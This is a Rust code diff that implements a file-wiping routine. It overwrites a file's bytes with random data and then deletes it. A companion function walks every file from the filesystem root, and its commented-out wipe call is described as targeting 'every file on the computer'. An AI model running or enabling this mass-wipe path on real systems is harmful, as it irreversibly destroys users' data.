@@ -1,28 +1,27 @@
-use std::fs;
+use std::{fs, os::unix::prelude::FileExt};
 use std::fs::metadata;
 extern crate glob;
 use jwalk::WalkDir;
 use std::time::{Instant};
-use rand::{thread_rng, Rng};
+use rand::Rng;
+use std::io::Write;
 
 fn main() -> std::io::Result<()> {
-    // burn_operation()?;     
+    // burn_operation()?;  
+    burn_file("./test.txt")?;
      Ok(())
-
-
 }
 
     
 fn burn_operation() -> std::io::Result<()> {
-    //TODO: remove after debugging
+    //TODO: remove time elapsed after debugging
     let now = Instant::now();
 
+    //for every file on the computer, burn_file
     for file_path in WalkDir::new("/") {
         println!("{}", file_path.unwrap().path().display());
         // burn_file(file_path.unwrap().path().display().to_string().as_str())?;
       }
-
-    //TODO: remove after debugging
 
       println!("Time elapsed: {} seconds", now.elapsed().as_secs());
 
@@ -31,16 +30,23 @@ fn burn_operation() -> std::io::Result<()> {
 
 
 fn burn_file(path: &str) -> std::io::Result<()> {
-    //TODO: Logic to wipe file with rand bye write logic
+    //get the file size
     let file_size = metadata(path)?.len();
-    //create byte array with file size
-    let mut arr = [0i8; file_size];
-    //write rand bytes to the array
-    thread_rng().fill(&mut arr[..]);
-    //write the rand byte array to the file
-    fs::write("./test.txt", arr);
+    //create a random number generator
+    let mut rng = rand::thread_rng();
+    //open the file and give write permissions
+    let mut f = std::fs::OpenOptions::new().write(true).open(path)?;
+    //for each byte in the file, overwrite it with a random byte
+    for i in 0..file_size { 
+      let rand_byte = rng.gen::<u8>();
+      f.write_at(&[rand_byte], i)?;
+      
+    }
+    //ensure that every byte could be overwritten, if not return an error
+    f.flush()?;
+ 
     //delete the file
-    // fs::remove_file(path)?;
+    fs::remove_file(path)?;
     
     Ok(())
 }
